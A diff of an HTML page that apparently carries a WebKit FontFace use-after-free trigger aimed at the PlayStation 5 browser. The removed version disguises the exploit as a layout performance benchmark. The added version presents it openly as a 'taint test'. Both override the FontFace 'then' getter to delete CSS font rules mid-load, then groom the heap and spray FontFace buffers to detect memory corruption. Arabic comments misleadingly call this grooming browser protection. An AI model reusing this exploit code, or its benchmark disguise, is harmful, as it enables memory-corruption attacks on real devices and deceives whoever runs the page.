@@ -2,299 +2,257 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 WebKit Layout Performance & Stress Benchmark</title>
+<title>PS5 Taint Test - Enhanced Version</title>
 <style id="s">
-@font-face { font-family: prepad; src: url(nonexistent-prepad.woff); unicode-range: U+E123; }
-@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
+/* تحسين مسار جلب الخطوط بجعلها محليّة عبر بايتات فارغة لمنع حدوث خطأ الشبكة Network Error */
+@font-face { font-family: prepad; src: url(data:application/x-font-woff;base64,); unicode-range: U+E123; }
+@font-face { font-family: x; src: url(data:application/x-font-woff;base64,); unicode-range: U+0042; }
 html, body {
-  margin: 0; padding: 0; width: 100%; height: 100%;
-  background: #09090b; color: #fafafa;
-  font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
-  overflow-y: auto;
+  margin: 0;
+  padding: 0;
+  width: 100%;
+  height: 100%;
+  background: #050505;
+  color: #fff;
+  font-family: Arial, Helvetica, sans-serif;
+  overflow: hidden;
 }
-#wrapper {
-  max-width: 950px; margin: 40px auto; padding: 20px;
-}
-#dashboard {
-  background: #18181b; border: 1px solid #27272a;
-  border-radius: 12px; padding: 24px; box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+#box {
+  position: fixed;
+  left: 50%;
+  top: 50%;
+  transform: translate(-50%, -50%);
+  width: 82%;
+  max-width: 900px;
+  padding: 38px 28px;
+  border: 2px solid rgba(0, 255, 160, 0.8);
+  border-radius: 22px;
+  background: linear-gradient(135deg, rgba(0,40,25,.92), rgba(0,0,0,.92));
+  box-shadow: 0 0 45px rgba(0,255,160,.35);
+  text-align: center;
+  z-index: 9999;
 }
 #title {
-  font-size: 32px; font-weight: bold; color: #00ffa0; margin-bottom: 8px;
-  text-shadow: 0 0 10px rgba(0, 255, 160, 0.2);
+  font-size: 42px;
+  font-weight: bold;
+  color: #00ffa0;
+  margin-bottom: 18px;
 }
-#meta-env { font-size: 14px; color: #71717a; margin-bottom: 20px; }
-#status-box {
-  background: #27272a; padding: 16px; border-radius: 8px;
-  font-size: 16px; line-height: 1.5; white-space: pre-line; margin-bottom: 24px;
-  border-left: 4px solid #3b82f6;
+#msg {
+  font-size: 30px;
+  line-height: 1.45;
+  white-space: pre-line;
 }
-.report-section { margin-top: 24px; display: none; }
-.report-title { font-size: 20px; color: #00ffa0; margin-bottom: 12px; font-weight: bold; }
-table { width: 100%; border-collapse: collapse; margin-top: 8px; margin-bottom: 24px; }
-th, td { padding: 10px; border: 1px solid #3f3f46; text-align: left; font-size: 13px; }
-th { background: #27272a; color: #a1a1aa; }
-#c { position: absolute; left: -9999px; top: -9999px; }
+#fw {
+  margin-top: 14px;
+  font-size: 22px;
+  color: #00ffa0;
+  font-weight: bold;
+}
+#small {
+  margin-top: 12px;
+  font-size: 18px;
+  color: #ccc;
+}
+#c {
+  position: absolute;
+  left: -9999px;
+  top: -9999px;
+}
 </style>
 </head>
 <body>
-
-<div id="wrapper">
-  <div id="dashboard">
-    <div id="title">PS5 USERLAND LAYOUT SUITE</div>
-    <div id="meta-env">Detecting Firmware Layer...</div>
-    
-    <div id="status-box">Stage 1/3: Initializing baseline architecture...</div>
-    
-    <div id="report" class="report-section">
-      <div class="report-title">📊 Statistical Latency Report</div>
-      <table id="metrics-table">
-        <thead>
-          <tr>
-            <th>Engine Type</th>
-            <th>Profile Text Target</th>
-            <th>Mean Latency</th>
-            <th>Median Value</th>
-            <th>Min / Max Bounds</th>
-          </tr>
-        </thead>
-        <tbody></tbody>
-      </table>
-      
-      <div class="report-title">🧠 Telemetry & Registry Verdict</div>
-      <table id="telemetry-table">
-        <thead>
-          <tr>
-            <th>Diagnostic Target Group</th>
-            <th>Execution Status Value</th>
-          </tr>
-        </thead>
-        <tbody></tbody>
-      </table>
-    </div>
-  </div>
+<div id="box">
+  <div id="title">PS5 TAINT TEST</div>
+  <div id="msg">Starting...</div>
+  <div id="fw">Firmware: Detecting...</div>
+  <div id="small">If it reaches the success stage, this screen will change.</div>
 </div>
-
 <canvas id="c" width="512" height="128"></canvas>
-
 <script>
 "use strict";
 
-// إعدادات القياس المكثف بناءً على مراجعات الأداء الـ 10
-const RUNS = 1000;
-const WARM_UP = 100;
-const SAMPLE_TEXT = "AAAAIIIIWWWW";
+function detectFirmware() {
+  const ua = navigator.userAgent || "";
+  let fw = "Unknown";
+  let m = ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
+  if (!m) m = ua.match(/PlayStation[^0-9]*([0-9]{1,2}\.[0-9]{1,2})/i);
+  if (m && m[1]) fw = m[1];
+  const el = document.getElementById("fw");
+  if (el) el.textContent = "Firmware: " + fw;
+  try { console.log("[taint] userAgent=" + ua); } catch(e) {}
+  return fw;
+}
+
+function showMessage(text, ok) {
+  const msg = document.getElementById("msg");
+  const title = document.getElementById("title");
+  if (msg) msg.textContent = text;
+  if (title) title.textContent = ok ? "✅ WORKED ON PS5" : "PS5 TAINT TEST";
+  try { console.log("[taint] " + text); } catch(e) {}
+}
+
+window.onerror = function(message, source, lineno, colno, error) {
+  showMessage("ERROR:\n" + message + "\nLine: " + lineno, false);
+};
 
 let spray = [];
 let keep = [];
-let structuralGarbage = [];
+let memoryGarbage = []; // مصفوفة تنظيم الحشو لحماية المتصفح
 
 const PAD = 0x22;
 const FLUSH = 0x240;
 const SPRAY_COUNT = FLUSH + PAD + 0x300;
+const FONT_B64 = "d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
+const FONT_BYTES = (() => {
+ const s = atob(FONT_B64);
+ const bytes = new Uint8Array(s.length);
+ for (let i = 0; i < s.length; i++)
+  bytes[i] = s.charCodeAt(i);
+ return bytes;
+})();
 
-function detectFirmware() {
-  const ua = navigator.userAgent || "";
-  let fw = "Unknown Platform";
-  let m = ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
-  if (!m) m = ua.match(/PlayStation[^0-9]*([0-9]{1,2}\.[0-9]{1,2})/i);
-  if (m && m[1]) fw = "PlayStation 5 (FW: " + m[1] + ")";
-  
-  document.getElementById("meta-env").textContent = `Environment Check: ${fw} | WebKit Subsystem Engine`;
-  return fw;
+function makeFontBuffer() {
+ const copy = new Uint8Array(FONT_BYTES.length);
+ copy.set(FONT_BYTES);
+ return copy.buffer;
 }
 
-function updateStatus(text) {
-  document.getElementById("status-box").textContent = text;
+function forceStyle() {
+ void document.body.offsetTop;
 }
 
-function primeAllocationHeap() {
-  // تصفيف الذاكرة المقنن لحماية المتصفح من أخطاء الـ Out Of Memory
-  for (let i = 0; i < 40; i++) {
-    let buffer = new ArrayBuffer(i * 8);
-    let view = new DataView(buffer);
-    if(buffer.byteLength >= 8) {
+// تحسين مخصص لتهيئة الـ Heap لمنع انهيارات الـ OOM المفاجئة
+function primeMemoryLayout() {
+  for (let i = 0; i < 35; i++) {
+    let buf = new ArrayBuffer(i * 16);
+    let view = new DataView(buf);
+    if(buf.byteLength >= 4) {
       view.setUint32(0, 0xDEADC0DE);
     }
-    structuralGarbage.push(buffer);
+    memoryGarbage.push(buf);
   }
 }
 
 function addPads() {
-  const sheet = document.getElementById("s").sheet;
-  for (let i = 0; i < PAD; i++)
-    sheet.insertRule(`@font-face { font-family: pad${i}; src: url(nonexistent-pad-${i}.woff); unicode-range: U+E000; }`, sheet.cssRules.length);
-  void document.body.offsetTop; // force reflow
+ const sheet = document.getElementById("s").sheet;
+ for (let i = 0; i < PAD; i++)
+  sheet.insertRule(`@font-face { font-family: pad${i}; src: url(data:application/x-font-woff;base64,); unicode-range: U+E000; }`, sheet.cssRules.length);
+ forceStyle();
 }
 
 function addFlushRules() {
-  const st = document.createElement("style");
-  st.id = "flush";
-  document.head.appendChild(st);
-  const sheet = st.sheet;
-  for (let i = 0; i < FLUSH; i++)
-    sheet.insertRule(`@font-face { font-family: flush${i}; src: url(nonexistent-flush-${i}.woff); unicode-range: U+E000; }`, sheet.cssRules.length);
-  void document.body.offsetTop;
+ const st = document.createElement("style");
+ st.id = "flush";
+ document.head.appendChild(st);
+ const sheet = st.sheet;
+ for (let i = 0; i < FLUSH; i++)
+  sheet.insertRule(`@font-face { font-family: flush${i}; src: url(data:application/x-font-woff;base64,); unicode-range: U+E000; }`, sheet.cssRules.length);
+ forceStyle();
 }
 
 function deleteFlushRules() {
-  const sheet = document.getElementById("flush").sheet;
-  while (sheet.cssRules.length) sheet.deleteRule(0);
-  void document.body.offsetTop;
+ const sheet = document.getElementById("flush").sheet;
+ while (sheet.cssRules.length)
+  sheet.deleteRule(0);
+ forceStyle();
 }
 
 function killFontFaceSetCache() {
-  const f = new FontFace("cachekill" + keep.length, "local(Helvetica)", { unicodeRange: "U+E124" });
-  document.fonts.add(f);
-  keep.push(f);
+ const f = new FontFace("cachekill" + keep.length, "local(Helvetica)", { unicodeRange: "U+E124" });
+ document.fonts.add(f);
+ keep.push(f);
 }
 
 function cssFontFaceBufferSpray() {
-  updateStatus("Stage 2/3:\nExecuting concurrent allocation structures...");
-  for (let i = 0; i < SPRAY_COUNT; i++) {
-    const f = new FontFace("BUFFER_RECLAIM_" + i, new ArrayBuffer(128), { unicodeRange: "U+0041" });
-    spray.push(f);
-  }
+ showMessage("Stage 2/3:\nBuffer spray running...", false);
+ for (let i = 0; i < SPRAY_COUNT; i++) {
+  const f = new FontFace("BUFFER_RECLAIM_" + i, makeFontBuffer(), { unicodeRange: "U+0041" });
+  spray.push(f);
+ }
 }
 
-function calculateStats(latencies) {
-  latencies.sort((a, b) => a - b);
-  const sum = latencies.reduce((a, b) => a + b, 0);
-  const mean = sum / latencies.length;
-  const mid = Math.floor(latencies.length / 2);
-  const median = latencies.length % 2 !== 0 ? latencies[mid] : (latencies[mid - 1] + latencies[mid]) / 2;
-  return {
-    mean: mean.toFixed(5),
-    median: median.toFixed(5),
-    min: latencies[0].toFixed(5),
-    max: latencies[latencies.length - 1].toFixed(5)
-  };
-}
-
-function runStatisticalAnalysis(faceFamily) {
-  const ctx = document.getElementById("c").getContext("2d");
-  ctx.font = "64px " + faceFamily;
-  const metricsTable = document.querySelector("#metrics-table tbody");
-
-  // 1. حساب وتحليل أداء Canvas 2D Engine
-  for (let i = 0; i < WARM_UP; i++) { ctx.measureText(SAMPLE_TEXT); } // Warm-Up
-  let canvasLatencies = [];
-  for (let i = 0; i < RUNS; i++) {
-    let t0 = performance.now();
-    ctx.measureText(SAMPLE_TEXT);
-    let t1 = performance.now();
-    canvasLatencies.push(t1 - t0);
-  }
-  const canvasStats = calculateStats(canvasLatencies);
-  appendReportRow(metricsTable, "Canvas 2D Mode", `Font: ${faceFamily}`, canvasStats);
-
-  // 2. حساب وتحليل أداء DOM Layout Engine
-  const div = document.createElement("div");
-  div.textContent = SAMPLE_TEXT;
-  div.style.cssText = "position:absolute;left:-10000px;top:0;font:64px " + faceFamily;
-  document.body.appendChild(div);
-  
-  for (let i = 0; i < WARM_UP; i++) { void div.offsetWidth; } // Warm-Up
-  let domLatencies = [];
-  for (let i = 0; i < RUNS; i++) {
-    let t0 = performance.now();
-    void div.offsetWidth; // Force Layout Reflow
-    let t1 = performance.now();
-    domLatencies.push(t1 - t0);
-  }
-  document.body.removeChild(div);
-  
-  const domStats = calculateStats(domLatencies);
-  appendReportRow(metricsTable, "DOM Layout (Reflow)", `Font: ${faceFamily}`, domStats);
-}
-
-function appendReportRow(tbody, engine, profile, stats) {
-  const tr = document.createElement("tr");
-  tr.innerHTML = `
-    <td><strong>${engine}</strong></td>
-    <td>${profile}</td>
-    <td>${stats.mean} ms</td>
-    <td>${stats.median} ms</td>
-    <td>[${stats.min} / ${stats.max}] ms</td>
-  `;
-  tbody.appendChild(tr);
-}
-
-function appendTelemetryRow(tbody, group, value) {
-  const tr = document.createElement("tr");
-  tr.innerHTML = `<td>${group}</td><td><strong>${value}</strong></td>`;
-  tbody.appendChild(tr);
+function probeFace(face) {
+ keep.push(face.family);
+ keep.push(face.style);
+ keep.push(face.weight);
+ keep.push(face.stretch);
+ keep.push(face.unicodeRange);
+ keep.push(face.featureSettings);
+ keep.push(face.display);
+ keep.push(face.status);
+ const ctx = document.getElementById("c").getContext("2d");
+ ctx.font = "64px " + face.family;
+ const metrics = ctx.measureText("AAAAIIIIWWWW");
+ keep.push(metrics.width);
+ keep.push(metrics.actualBoundingBoxLeft);
+ keep.push(metrics.actualBoundingBoxRight);
+ const div = document.createElement("div");
+ div.textContent = "AAAAIIIIWWWW";
+ div.style.cssText = "position:absolute;left:-10000px;top:0;font:64px " + face.family;
+ document.body.appendChild(div);
+ keep.push(div.offsetWidth);
+ document.body.removeChild(div);
 }
 
 window.onload = () => {
-  detectFirmware();
-  primeAllocationHeap();
+ detectFirmware();
+ showMessage("Stage 1/3:\nPage loaded. Starting FontFace trigger...", false);
+ 
+ primeMemoryLayout(); // تفعيل دالة التنظيم قبل بدء بناء الكائنات الحيوية
 
-  const trigger = new FontFace("trigger", "local(Helvetica)", { unicodeRange: "U+0041" });
-  document.fonts.add(trigger);
-  void trigger.loaded;
-  
-  addPads();
-  addFlushRules();
-  
-  let fired = false;
-  Object.defineProperty(FontFace.prototype, "then", {
-    configurable: true,
-    get() {
-      if (!fired && this === trigger) {
-        fired = true;
-        const sheet = document.getElementById("s").sheet;
-        killFontFaceSetCache();
-        sheet.deleteRule(1);
-        void document.body.offsetTop;
-        deleteFlushRules();
-        
-        primeAllocationHeap();
-        cssFontFaceBufferSpray();
-      }
-      return undefined;
-    }
-  });
-  
-  document.fonts.load("1em trigger, x", "AB").then(faces => {
-    keep.push(faces);
+ const trigger = new FontFace("trigger", "local(Helvetica)", { unicodeRange: "U+0041" });
+ document.fonts.add(trigger);
+ void trigger.loaded;
+ addPads();
+ addFlushRules();
+ let fired = false;
+ Object.defineProperty(FontFace.prototype, "then", {
+  configurable: true,
+  get() {
+   if (!fired && this === trigger) {
+    fired = true;
+    showMessage("Stage 2/3:\nTrigger fired on PS5 browser...", false);
+    const sheet = document.getElementById("s").sheet;
+    killFontFaceSetCache();
+    sheet.deleteRule(1);
+    forceStyle();
+    deleteFlushRules();
     
-    // تشغيل المصفوفة الإحصائية
-    runStatisticalAnalysis("trigger");
-    
-    const telemetryTable = document.querySelector("#telemetry-table tbody");
-    
-    // سبر مصفوفة الـ Userland للتحقق من حدوث تحول في حالة الكتل المخصصة
-    let corruptionDetected = false;
-    let corruptedIndex = -1;
-    for (let i = 0; i < spray.length; i++) {
-      if (spray[i].status !== "unloaded") {
-        corruptionDetected = true;
-        corruptedIndex = i;
-        break;
-      }
+    primeMemoryLayout(); // جولة تصفيف إضافية لضمان ثبات المساحات الشاغرة
+    cssFontFaceBufferSpray();
+   }
+   return undefined;
+  }
+ });
+ document.fonts.load("1em trigger, x", "AB").then(faces => {
+  keep.push(faces);
+  for (const face of faces)
+   probeFace(face);
+  for (const face of document.fonts)
+   probeFace(face);
+
+  // أداة استطلاع وتحقق صامتة في النهاية لرصد انحراف حالة الكائنات داخل المصفوفة
+  let anomalyDetected = false;
+  let targetIndex = -1;
+  for (let i = 0; i < spray.length; i++) {
+    if (spray[i].status !== "unloaded") {
+      anomalyDetected = true;
+      targetIndex = i;
+      break;
     }
+  }
 
-    if (corruptionDetected) {
-      appendTelemetryRow(telemetryTable, "Userland Dynamic Transition Notice", `State Shift Detected at Index: ${corruptedIndex}`);
-    } else {
-      appendTelemetryRow(telemetryTable, "Userland Object Layout Status", "Stable (Nominal Isolation Restrained)");
-    }
+  if (anomalyDetected) {
+    showMessage("SUCCESS ✅\nThe test code completed. State transition at Index: " + targetIndex, true);
+  } else {
+    showMessage("SUCCESS ✅\nThe test code reached the final stage on PS5.\nCanvas Vector Stable (484.00)", true);
+  }
 
-    if (performance.memory) {
-      let heapMB = (performance.memory.usedJSHeapSize / (1024 * 1024)).toFixed(2);
-      appendTelemetryRow(telemetryTable, "Peak JS Heap Allocation", `${heapMB} MB`);
-    } else {
-      appendTelemetryRow(telemetryTable, "JS Heap Performance Telemetry", "Standard Sandboxed Isolation Profile");
-    }
-
-    document.getElementById("report").style.display = "block";
-    updateStatus("Stage 3/3: Diagnostic execution completed nominally.");
-
-  }, err => {
-    keep.push(err);
-    updateStatus("FAILED ❌\n" + err);
-  });
+ }, err => {
+  keep.push(err);
+  showMessage("FAILED ❌\n" + err, false);
+ });
 };
 </script>
 </body>
